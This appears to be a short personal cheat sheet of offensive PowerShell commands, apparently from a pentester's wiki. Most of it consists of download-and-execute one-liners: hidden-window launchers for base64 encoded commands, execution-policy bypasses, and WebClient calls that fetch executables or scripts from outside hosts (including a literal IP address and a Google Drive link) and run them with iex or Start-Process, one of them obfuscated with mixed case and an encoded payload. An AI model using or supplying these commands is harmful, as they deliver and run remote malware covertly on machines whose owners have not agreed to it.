<!-- TITLE: Powershell -->
<!-- SUBTITLE: A quick summary of Powershell -->

# Get Help
``text
get-help Get-EventLog -ShowWindow
```

# Change Execution policy
```text
Set-executionPolicy -Scope CurrentUser Unrestricted
```

# Execute
```text
%COMSPEC% /B /C start powershell.exe -Command $si = New-Object
System.Diagnostics.ProcessStartInfo;$si.FileName = 'powershell.exe';
$si.Arguments = ' -EncodedCommand [BASE64 PAYLOAD] ';
$si.UseShellExecute = $false;
$si.RedirectStandardOutput = $true;$si.WindowStyle = 'Hidden';
$si.CreateNoWindow = $True;
$p = [System.Diagnostics.Process]::Start($si);
```

# Download and Execute
Good reference for many ways:  https://www.greyhathacker.net/?p=500

rmudge_loader.exe - runs executable

```text
powershell (New-Object System.Net.WebClient).DownloadFile('http://<ip>',c:\temp\test.exe'); (New-Object -com Shell.Application).ShellExecute('c:\temp\test.exe');

PowerShell (New-Object System.Net.WebClient).DownloadFile('http://www.greyhathacker.net/tools/messbox.exe','mess.exe');Start-Process 'mess.exe'

powershell -exec bypass -c "(New-Object Net.WebClient).Proxy.Credentials=[Net.CredentialCache]::DefaultNetworkCredentials;iwr('http://webserver/payload.ps1')|iex"

```

```
More
powershell.exe -command PowerShell -ExecutionPolicy bypass -noprofile -windowstyle hidden -command (New-Object System.Net.WebClient).DownloadFile('https://drive.google.com/uc?export=download&id=0B1NUTMCAOKBTdVQzTXlUNHBmZUU',"$env:APPDATA\ps.exe");Start-Process ("$env:APPDATA\ps.exe")


## Version1
c:\Windows\System32\cmd.exe /c powershell.exe -w hidden -noni -nop -c "iex(New-Object System.Net.WebClient).DownloadString('http://45.58.34.196:8080/p')"


## Version2
c:\windows\system32\cmd.exe /c PowErsHelL.EXE -eXecUtiONPoLICy bYPass -NOPROfilE -WinDoWSTYlE hiDden -EnCodeDcOmmAnd IAAoAE4AZQB3AC0ATwBiAEoAZQBDAFQAIABzAFkAcwB0AEUAbQAuAG4AZQBUAC4AdwBlAGIAQwBsAEkARQBOAFQAKQAuAEQATwBXAG4AbABvAGEAZABGAEkAbABlACgAIAAdIGgAdAB0AHAAcwA6AC8ALwBqAHQAYQBiA
```

# Execute in memory

# Invoke DLL functions
